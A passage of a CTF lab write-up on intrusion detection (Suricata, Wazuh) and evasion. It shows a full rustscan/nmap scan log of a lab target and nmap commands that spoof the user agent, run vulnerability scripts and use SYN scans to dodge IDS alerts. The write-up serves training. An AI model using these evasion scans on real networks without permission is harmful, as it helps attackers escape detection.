# Intrusion Detection — Writeup

## Overview
### Intrusion Detection — Writeup
### Intrusion Detection — Writeup
----
Learn cyber evasion techniques and put them to the test against two IDS
---
![](https://ctfresources.s3.eu-west-2.amazonaws.com/bannerhq.png)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/9f5785fc9979f57ec0df40f2f06d8f2b.png)
### Introduction
Start Machine
Have you ever completed a CTF and wondered, "Would I have been detected?". This room will serve as an introduction to the world of intrusion detection systems (IDS) and cyber evasion techniques. To complete this room, you will need to orchestrate a full system takeover whilst experimenting with evasion techniques from all stages of the cyber kill chain.
This room also demonstrates the first public test of a new CTF scoring system designed to add additional interactivity, feedback, and re-playability to CTFs. In short, this system and several open source IDS can be combined to provide a per-user breakdown, and scoring of all the IDS alerts created during the course of a CTF.
You can access the system by navigating to [http://MACHINE_IP:8000/register](http://machine_ip:8000/register)**.**
**NOTE:** This room can take up to five minutes to be fully available, so you may not be able to register immediately. However, you can work through the first few tasks without complete access to the system. Also, make sure that you register an account before running any attacks.
Answer the questions below
Deploy the target machine and create an account and log into the system at http://MACHINE_IP:8000, in preparation for future tasks.
Make sure that you make note of the access token that is provided to you after registration
```text
crc9WpQ1ZGztMANkV7QfIeaxDJexSyiO8CaDgxyksopL7KgQN-n9w6v5AfbCGa0fiyjPQznYxop-N4IEgNIM0Qn-7wpuzhOl1NeN6IKAYQ8id9j5VjPJ4pp5YyzNdcZjhDm38rPV-0bjUaVSvWpnSFcpHo2n8zlDtPPqopo03hI

Note: This token will only be shown once, so make sure it's stored in a secure location. Use it to access your new account via the login page
```
![[Pasted image 20230214212733.png]]
![[Pasted image 20230214212812.png]]
### Intrusion Detection Basics
Intrusion detection systems (IDS) are a tool commonly deployed to defend networks by automating the detection of suspicious activity. Where a firewall, anti-virus, or authorisation system may prevent certain activity from occurring on or against IT assets, an IDS will instead monitor activity that isn't restricted and sort the malicious from the benign. IDS commonly apply one of two different detection methodologies; Signature (or rule) based IDS will apply a large rule set to search one or more data sources for suspicious activity whereas, Anomaly-based IDS establish what is considered normal activity and then raise alerts when an activity that does not fit the baseline is detected.
Either way, once an incident is detected, the IDS will generate an alert and will then forward it further up the security chain to log aggregation or data visualisation platforms like [Graylog](https://www.graylog.org/products/open-source) or the [ELK Stack](https://www.elastic.co/what-is/elk-stack). Some IDS may also feature some form of intrusion prevention technology and may automatically respond to the incident.
Two signature-based IDS are attached to this demo; [Suricata](https://suricata.io/), a network-based IDS (NIDS), and [Wazuh](https://wazuh.com/), a host-based IDS (HIDS). Both of these IDS implement the same overarching signature detection methodology; however, their overall behaviour and the types of attacks that they can detect differ greatly. We will cover the exact differences in more detail in the following tasks.
Answer the questions below
What IDS detection methodology relies on rule sets?
*Signature-based detection*
### Network-based IDS (NIDS)
-   Malware command and control
-   Exploitation tools
-   Scanning
-   Data exfiltration
-   Contact with phishing sites
-   Corporate policy violations
Network-based detection allows a single installation to monitor an entire network which makes NIDS deployment more straightforward than other types. However, NIDS are more prone to generating false positives than other IDS, this is partly due to the sheer volume of traffic that passes through even a small network and, the difficulty of building a rule set that is flexible enough to reliably detect malicious traffic without detecting safe applications that may leave similar traces. This can be alleviated somewhat, by tuning the IDS to only enforce rules that would be considered abnormal traffic for any particular network however, this does take some time as the IDS must be deployed on a network for a while in order to establish what traffic is normal.
NIDS can be deployed on both sides of the firewall though, they tend to be deployed on the LAN side as there is limited value in detecting attacks that occur against outside nodes as they will be under attack constantly. A NIDS may also feature some form of intrusion prevention (IPS) functionality and be able to block nodes that trigger a set number of alerts, this is not always enabled as automated blocking can conflict with a high false-positive rate. Note, that NIDS rely on having access to all of the communication between nodes and are thus affected by the widespread adoption of in-transit encryption.
A variety of open source and proprietary NIDS exist, the node in this scenario is protected by the open source NIDS, Suricata. For this, demo the IPS mode is disabled so you are free to run as many attacks as you want. In fact, try and run some of your favourite tools against the target and see how the different IDS respond. A history of all the alerts generated during this room is available at http://10.10.133.96:8000/alerts
Answer the questions below
What widely implemented protocol has an adverse effect on the reliability of NIDS?
*TLS*
Experiment by running tools against the target and viewing the resultant alerts. Is there any unexpected activity?
Some of the more obscure nmap modes can produce interesting results.
![[Pasted image 20230215154238.png]]

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.133.96 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.133.96:22
Open 10.10.133.96:80
Open 10.10.133.96:3000
Open 10.10.133.96:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan
Scanning 10.10.133.96 [4 ports]
Discovered open port 80/tcp on 10.10.133.96
Discovered open port 22/tcp on 10.10.133.96
Discovered open port 3000/tcp on 10.10.133.96
Discovered open port 8000/tcp on 10.10.133.96
Completed Connect Scan (4 total ports)
Initiating Service scan
Scanning 4 services on 10.10.133.96
Service scan Timing: About 75.00% done; ETC: 15:42 (0:00:32 remaining)
Completed Service scan (4 services on 1 host)
NSE: Script scanning 10.10.133.96.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.133.96
Host is up, received user-set (0.20s latency).

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8e4a4e47951c89de3fb776f9303d5e60 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5oNl9uGE2nh2cWajVG5uSLvPMlacz8PlM6f8/7cUsSYl0T4rH89xek8p2pUqvRTAxcQVP8FmfPyWVONKnqp4BJp9Wsiu+SMX33gm/C2oJ80+No/CmjcvnFdhYLOydto/7Yvlu5pPHGm7fQBABgCnBp+2AXv9UE0WipodW+QdlE+9+2c6IU/rDidzBy5VvEOZbbTjxp9tzYXpv7JwTTsvI1l7Hdzui3xrBl+5fE7qMVfb/KHRHPPgsuAYWO3IwDZVAqp5xsy/VqM22Bg5jklVTyh0I43VYtVfblwTipNr/S/fb2tCMdXOAG43nog5C3CBPWO6Urja/2IbEuHwgpTRI5Qe+z0LjPoCOwALbJGVU+kJIPLPGGDN6r4Plr1lonkEJJD7weMJTO/h8WAzSGIH5jApveDdetZwtmVNjS/yr8Xar+tbRw2NmLCIL5EeID/smsjoINf+GhWeaceVTMLk+uIYPSPm8RO7zNaDMS939BNImpaKW0RcZkgiexhAl6MM=
|   256 e0a284792fc9c5f09196d2bcb7836fe1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL+ELxWWSrqegoflaL4yIOw+hCNwDo46hcIhmZnzwfFzRExlV5/Kd6t57N4BDSVRnoVCoqm48N0McC3z4XB0OnU=
|   256 0ff277287ed3008e3f0b720a8d134031 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIES3kKL/wGu1X7iJ73homZbC6XT9HFKfHDY3FmHCIKku
80/tcp   open  http     syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Home | Reverse Gear Racing Team
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?     syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 15 Feb 2023 20:40:37 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 15 Feb 2023 20:40:02 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 15 Feb 2023 20:40:08 GMT
|_    Content-Length: 0
8000/tcp open  http-alt syn-ack gunicorn
| http-title: Login | CTFScore
|_Requested resource was http://10.10.133.96:8000/login?next=%2F
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Wed, 15 Feb 2023 20:40:08 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 661
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>File Not Found | Advanced CTF Scoring System</title>
|     <link rel="stylesheet" href="/static/styles/master.css">
|     </head>
|     <body>
|     <main>
|     <div class="error_card">
|     <h1>Not Found</h1>
|     requested URL was not found on the server. If you entered the URL manually please check your spelling and try again. Click <a href="/index">here</a> to return to the home page.
|     </p>
|     </div>
|     </main>
|     </body>
|     </html>
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 193
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid Request Line &#x27;Invalid HTTP request line: &#x27;&#x27;&#x27;
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     Server: gunicorn
|     Date: Wed, 15 Feb 2023 20:40:02 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 236
|     Location: http://0.0.0.0:8000/login?next=%2F
|     Vary: Cookie
|     Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.Y-1DIg.2jcTze7pj6nTGQ8MMt96Qj7LLQc; HttpOnly; Path=/
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|_    <p>You should be redirected automatically to target URL: <a href="/login?next=%2F">/login?next=%2F</a>. If not click the link.
|_http-server-header: gunicorn
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.93%I=7%D=2/15%Time=63ED4322%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2020:40
SF::02\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20We
SF:d,\x2015\x20Feb\x202023\x2020:40:08\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2020:40:37\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.93%I=7%D=2/15%Time=63ED4322%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,11E,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\nContent-Type:\x20text/html\r\nContent-Length:\x20193\r\n\r\n<htm
SF:l>\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x20Request</title>\n\x20
SF:\x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p><
SF:/h1>\n\x20\x20\x20\x20Invalid\x20Request\x20Line\x20&#x27;Invalid\x20HT
SF:TP\x20request\x20line:\x20&#x27;&#x27;&#x27;\n\x20\x20</body>\n</html>\
SF:n")%r(GetRequest,26E,"HTTP/1\.0\x20302\x20FOUND\r\nServer:\x20gunicorn\
SF:r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2020:40:02\x20GMT\r\nConnection:
SF:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Le
SF:ngth:\x20236\r\nLocation:\x20http://0\.0\.0\.0:8000/login\?next=%2F\r\n
SF:Vary:\x20Cookie\r\nSet-Cookie:\x20session=eyJfZmxhc2hlcyI6W3siIHQiOlsib
SF:WVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ\.Y-1D
SF:Ig\.2jcTze7pj6nTGQ8MMt96Qj7LLQc;\x20HttpOnly;\x20Path=/\r\n\r\n<!DOCTYP
SF:E\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<
SF:title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20
SF:should\x20be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20
SF:<a\x20href=\"/login\?next=%2F\">/login\?next=%2F</a>\.\x20If\x20not\x20
SF:click\x20the\x20link\.")%r(FourOhFourRequest,336,"HTTP/1\.0\x20404\x20N
SF:OT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2015\x20Feb\x20202
SF:3\x2020:40:08\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x20661\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"U
SF:TF-8\">\n\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
SF:tent=\"IE=edge\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20conten
SF:t=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<titl
SF:e>File\x20Not\x20Found\x20\|\x20Advanced\x20CTF\x20Scoring\x20System</t
SF:itle>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/st
SF:yles/master\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n<main>\n\x20\x2
SF:0\x20\x20<div\x20class=\"error_card\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<h1>Not\x20Found</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20The\x20requested\x20URL\x20was\x2
SF:0not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x
SF:20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\
SF:x20again\.\x20Click\x20<a\x20href=\"/index\">here</a>\x20to\x20return\x
SF:20to\x20the\x20home\x20page\.\n\x20\x20\x20\x20\x20\x20\x20\x20</p>\n\x
SF:20\x20\x20\x20</div>\n</main>\n\n</body>\n</html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.30 seconds
```
Now that the basics of NIDS have been covered, it's time to discuss some simple evasion techniques in the context of the first stage of the cyber kill chain, reconnaissance. First, run the following command against the target at 10.10.133.96
`nmap -sV 10.10.133.96   `
I recommend completing this [room](https://tryhackme.com/room/furthernmap) if you're unfamiliar with `nmap`. In simple terms, the above command will retrieve a detailed listing of the services attached to the targeted node by performing a number of predefined actions against the target. As an example, `nmap` will request long paths from HTTP servers to deliberately create 404 errors some HTTP servers will provide additional information when a 404 error is triggered.
The above command does not make use of any evasion techniques and as a result, most NIDS should be able to detect it with no issue, in fact, you should be able to verify this now by navigating to 10.10.133.96:8000/alerts. Suricata should have detected that some packets contain the default `nmap` user agent and triggered an alert. Suricata will have also detected the unusual HTTP requests that `nmap` makes to trigger responses from applications targeted for service versioning. Wazuh may have also detected the 400 error codes made during the course of the scan.
We can use this information to test our first evasion strategy. By appending the following to change the user_agent `http.useragent=<AGENT_HERE>`, we can set the user agent used by `nmap` to a new value and partially evade detection. Try running the command now, a big list of user agents is available [here](https://developers.whatismybrowser.com/useragents/explore/). The final command should look something like this:
`nmap -sV --script-args http.useragent="<USER AGENT HERE>" 10.10.133.96`
Note, that this strategy isn't perfect as both Suricata and Wazuh are more than capable of detecting the activity from the aggressive scans. Try running the following `nmap` command with the new User-Agent:
`nmap --script=vuln --script-args http.useragent="<USER AGENT HERE>" 10.10.133.96`
The above command tells `nmap` to use the vulnerability detection scripts against the target that can return a wealth of information. However, as you may have noticed they also generate a significant number of IDS alerts even when specifying a different User-Agent as a `nmap` probes for a large number of potential attack vectors. It is also possible to evade detection by using `SYN (-sS)` or "stealth" scan mode; however, this returns much less information as it will not perform any service or version detection, try running this now:
`nmap -sS 10.10.133.96`
This is an important point as, in general, the more you evade an IDS the less information you will be able to retrieve. A good non-cyber analogue can be found in naval warfare with the use of active and passive sonar. If you were to helm a submarine and use active sonar to search for ships you may well be able to retrieve a lot of information about your opponents however, you would also allow your opponent to detect you just as easily as they could detect your active scans.
It is also important to also take note of the position of the target in relation to the network when performing reconnaissance. If the target asset is publicly accessible it may not be necessary to perform any evasion as it is highly likely that the asset is also under attack by a countless number of botnets and internet-wide scans and thus, the activity may be buried undersea by other attacks. On the other hand, publicly exposed assets may also be protected by rate-limiting tools like `fail2ban`. Scanning a site that is under the protection of such a tool is likely to result in your IP getting banned very quickly.
Conversely, if you're scanning an important database behind a corporate firewall that should never be accessed from the outside, a single IDS alert is likely to be the cause of some alarm. Note that, the scoring system does take this into account so the results you see for attacks against the target web server will be reduced when compared with the assets that will be attacked later in this room (the scoring system works somewhat like Golf so a higher score is worse).
We should also consider the exact definition of evasion as applied to IDS; it can either be complete, where no IDS alerts are triggered as a result of hostile actions, or, partial where an alert is triggered but, its severity is reduced. In some scenarios, complete evasion may be the only option for example, if valuable assets are involved. In other cases partial evasion may be just as good as low severity IDS alerts particularly from, NIDS are much less likely to be investigated, or even forwarded further up the alert management chain. Again, this is reflected by the scoring system as it will take the reliability of each of the attached IDS into account when scoring alerts.
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ nmap -sV 10.10.133.96                                    
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.133.96
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?
8000/tcp open  http-alt gunicorn
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.93%I=7%D=2/15%Time=63ED4B62%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2021:15
SF::14\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20We
SF:d,\x2015\x20Feb\x202023\x2021:15:20\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2021:15:49\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.93%I=7%D=2/15%Time=63ED4B62%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,11E,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\nContent-Type:\x20text/html\r\nContent-Length:\x20193\r\n\r\n<htm
SF:l>\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x20Request</title>\n\x20
SF:\x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p><
SF:/h1>\n\x20\x20\x20\x20Invalid\x20Request\x20Line\x20&#x27;Invalid\x20HT
SF:TP\x20request\x20line:\x20&#x27;&#x27;&#x27;\n\x20\x20</body>\n</html>\
SF:n")%r(GetRequest,26E,"HTTP/1\.0\x20302\x20FOUND\r\nServer:\x20gunicorn\
SF:r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2021:15:15\x20GMT\r\nConnection:
SF:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Le
SF:ngth:\x20236\r\nLocation:\x20http://0\.0\.0\.0:8000/login\?next=%2F\r\n
SF:Vary:\x20Cookie\r\nSet-Cookie:\x20session=eyJfZmxhc2hlcyI6W3siIHQiOlsib
